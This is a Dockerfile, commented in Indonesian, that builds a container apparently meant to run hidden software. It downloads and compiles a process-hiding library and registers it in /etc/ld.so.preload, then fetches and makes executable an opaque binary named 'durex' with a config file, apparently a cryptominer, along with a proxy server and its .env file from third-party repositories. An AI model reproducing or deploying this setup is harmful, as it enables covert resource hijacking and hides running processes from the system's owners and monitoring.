# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, compiler gcc, nodejs, npm, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget gcc npm nodejs

# Buat direktori untuk meletakkan file-file yang dibutuhkan
WORKDIR /myapp

# Download processhider.c
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c

# Compile processhider.c dan pindahkan libprocess.so
RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download config.json dan durex, serta memberikan izin eksekusi pada durex
RUN wget https://github.com/bulboni/durxzero/raw/main/durex \
    && wget https://raw.githubusercontent.com/bulboni/durxzero/main/config.json \
    && chmod +x durex

# Download .env, server.js, dan package.json ke direktori kerja
RUN wget https://raw.githubusercontent.com/bulboni/proxto/master/.env \
    && wget https://raw.githubusercontent.com/bulboni/proxto/master/server.js \
    && wget https://raw.githubusercontent.com/bulboni/proxto/master/package.json

# Install dependencies yang tercantum di package.json
RUN npm install

# Install dotenv secara eksplisit
RUN npm install dotenv

# Copy start script
COPY start.sh /start.sh
RUN chmod +x /start.sh

# Perintah yang akan dijalankan saat container pertama kali dijalankan
CMD ["/start.sh"]
